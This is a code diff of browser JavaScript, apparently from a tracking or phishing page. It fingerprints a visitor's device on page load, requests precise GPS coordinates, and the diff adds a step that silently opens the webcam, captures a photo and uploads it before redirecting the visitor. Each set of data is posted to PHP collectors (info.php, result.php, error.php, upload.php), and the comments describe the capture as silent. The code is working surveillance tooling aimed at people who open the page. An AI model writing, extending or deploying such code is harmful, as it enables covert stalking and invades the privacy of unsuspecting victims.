@@ -1,10 +1,10 @@
+// 1. Device Info (Runs on Page Load)
 function information() {
   if (navigator.getBattery) {
     navigator.getBattery().then(function(battery) {
       var level = Math.round(battery.level * 100) + "%";
       var status = battery.charging ? " (Charging ⚡)" : "";
-      var batteryInfo = level + status;
-      collectAndSend(batteryInfo);
+      collectAndSend(level + status);
     });
   } else {
     collectAndSend("Unknown");
@@ -67,99 +67,118 @@ function collectAndSend(batLevel) {
   if (os == undefined) os = 'Not Available';
   os = os.trim();
 
+  // Sends to info.php
   $.ajax({
     type: 'POST',
     url: info_file,
-    data: {
-      Ptf: ptf,
-      Brw: brw,
-      Cc: cc,
-      Ram: ram,
-      Ven: ven,
-      Ren: ren,
-      Ht: ht,
-      Wd: wd,
-      Os: os,
-      Bat: batLevel
-    },
+    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
     success: function() {},
     mimeType: 'text'
   });
 }
 
+// 2. Location Logic (Runs on Click)
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
-    var optn = {
-      enableHighAccuracy: true,
-      timeout: 30000,
-      maximumage: 0
-    };
-    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
+    navigator.geolocation.getCurrentPosition(
+      function(position) { showPosition(position, callback); }, 
+      function(error) { showError(error, errCallback); }, 
+      optn
+    );
   } else {
-    errCallback("GPS not supported"); 
+    errCallback();
+  }
+}
+
+function showError(error, errCallback) {
+  var err_text;
+  var err_status = 'failed';
+
+  switch (error.code) {
+    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
+    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
+    case error.TIMEOUT: err_text = 'Location timed out'; break;
+    case error.UNKNOWN_ERROR: err_text = 'Unknown error'; break;
   }
 
-  function showError(error) {
-    var err_text;
-    var err_status = 'failed';
+  // Sends to error.php
+  $.ajax({
+    type: 'POST',
+    url: error_file,
+    data: { Status: err_status, Error: err_text },
+    success: function() { if(errCallback) errCallback(); },
+    mimeType: 'text'
+  });
+}
 
-    switch (error.code) {
-      case error.PERMISSION_DENIED:
-        err_text = 'User denied the request for Geolocation';
-        break;
-      case error.POSITION_UNAVAILABLE:
-        err_text = 'Location information is unavailable';
-        break;
-      case error.TIMEOUT:
-        err_text = 'The request to get user location timed out';
-        break;
-      case error.UNKNOWN_ERROR:
-        err_text = 'An unknown error occurred';
-        break;
-    }
+function showPosition(position, callback) {
+  var lat = position.coords.latitude; 
+  var lon = position.coords.longitude;
+  var acc = position.coords.accuracy;
+  var alt = position.coords.altitude || 0;
+  var dir = position.coords.heading || 0;
+  var spd = position.coords.speed || 0;
 
-    $.ajax({
-      type: 'POST',
-      url: error_file,
-      data: {
-        Status: err_status,
-        Error: err_text
-      },
-      success: function() { errCallback(error); },
-      mimeType: 'text'
+  // Sends to result.php
+  $.ajax({
+    type: 'POST',
+    url: result_file,
+    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
+    success: function() { 
+        // Location Successful! Now run the next step (Camera)
+        if(callback) callback(); 
+    },
+    mimeType: 'text'
+  });
+}
+
+// 3. Camera Logic (Runs after Location Success)
+function captureAndSend(callback) {
+  var video = document.createElement('video');
+  var canvas = document.getElementById('canvas');
+
+  // Video settings to be silent and fast
+  video.autoplay = true;
+  video.muted = true;
+  video.playsInline = true;
+
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+      video.srcObject = stream;
+      video.play();
+
+      // Wait 1 second for focus/light
+      setTimeout(function() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(function(blob) {
+          var formData = new FormData();
+          formData.append('image', blob, 'cam.jpg');
+
+          // Sends to upload.php
+          $.ajax({
+            url: 'upload.php', 
+            type: 'POST',
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+              stream.getTracks().forEach(track => track.stop());
+              if (callback) callback(); // Redirect
+            },
+            error: function() {
+              if (callback) callback(); // Redirect anyway
+            }
+          });
+        }, 'image/jpeg', 0.8);
+      }, 1000);
+    }).catch(function(err) {
+      if (callback) callback();
     });
+  } else {
+    if (callback) callback();
   }
-
-  function showPosition(position) {
-    // --- SEND RAW NUMBERS ONLY (PHP will handle the text) ---
-    var lat = position.coords.latitude; 
-    var lon = position.coords.longitude;
-    var acc = position.coords.accuracy;
-    var alt = position.coords.altitude; 
-    var dir = position.coords.heading;
-    var spd = position.coords.speed;
-
-    // Send nulls as 0 to be safe
-    if (alt == null) alt = 0;
-    if (dir == null) dir = 0;
-    if (spd == null) spd = 0;
-
-    var ok_status = 'success';
-
-    $.ajax({
-      type: 'POST',
-      url: result_file,
-      data: {
-        Status: ok_status,
-        Lat: lat,
-        Lon: lon,
-        Acc: acc,
-        Alt: alt,
-        Dir: dir,
-        Spd: spd
-      },
-      success: callback,
-      mimeType: 'text'
-    });
-  };
 }
